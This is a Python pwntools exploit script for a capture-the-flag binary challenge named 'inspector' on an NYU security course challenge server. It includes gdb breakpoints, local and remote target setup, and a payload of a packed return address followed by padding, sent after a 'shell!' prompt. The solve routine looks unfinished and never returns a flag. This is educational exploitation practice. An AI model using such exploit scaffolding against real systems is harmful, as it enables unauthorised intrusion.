#import from py
import re

#outside imports
from pwn import *

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds

#challenge-specific info
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1246
netid='pk1898'

do_remote = False
binary_name = './inspector'

#for doing local debugging
is_local_dbg = True
gdb_script = '''
set pagination off
set disassembly-flavor intel
i pro
b *0x0040064a
b *0x0040066d
b *0x00400677
b *0x00400678
c
'''

#universal flag finder, given a string
def find_flag(input):
    m = re.findall(flag_regex, input)
    if(m != []):
        return m[0]
    else:
        return None


def solve(target):
    DATA = ''
    DATA += p64(0x0040064a)
    DATA += ('AAAA')
    print target.recvuntil("shell!")
    target.sendline(DATA)
    return None


#universal target setup for remote-only
def target():
    if(do_remote):
        r = remote(host, port)
        r.sendline(netid)
        r.recvline() # eat interstitial
        return r
    else:
        if(is_local_dbg):
            target = gdb.debug(binary_name, gdb_script)
        else:
            target = process(binary_name)
        return target

#scaffolding
def main():
    with target() as p:
        flag = solve(p)
    if(flag):
        print "Challenge Solved: %s" % flag
    else:
        print "Challenge Not Solved"

if __name__ == '__main__':
    main()
